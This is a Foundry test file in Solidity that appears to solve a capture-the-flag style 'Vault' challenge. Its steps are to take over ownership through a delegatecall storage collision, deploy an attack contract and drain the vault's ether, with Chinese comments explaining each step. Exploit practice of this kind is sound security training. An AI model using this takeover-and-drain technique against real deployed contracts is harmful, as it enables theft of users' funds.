// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "./VaultAttack.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    VaultAttack public attacker;

    address owner = address(1);
    address player = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.5 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(player, 1 ether);
        vm.startPrank(player);

        // 使用delegatecall调用changeOwner函数，将owner更改为攻击合约地址
        (bool success,) = address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", address(logic), player));
        require(success, "Attack failed");
        vault.openWithdraw();

        // 部署攻击合约
        attacker = new VaultAttack{value: 0.1 ether}(address(vault));
        // 使用攻击合约提款
        attacker.attack();

        // 检查攻击合约的余额
        uint256 attackerBalance = attacker.getBalance();
        console.log("Attacker balance (ether):", attackerBalance / 1 ether);
        require(attackerBalance >= 0.6 ether, "Insufficient attacker balance");

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}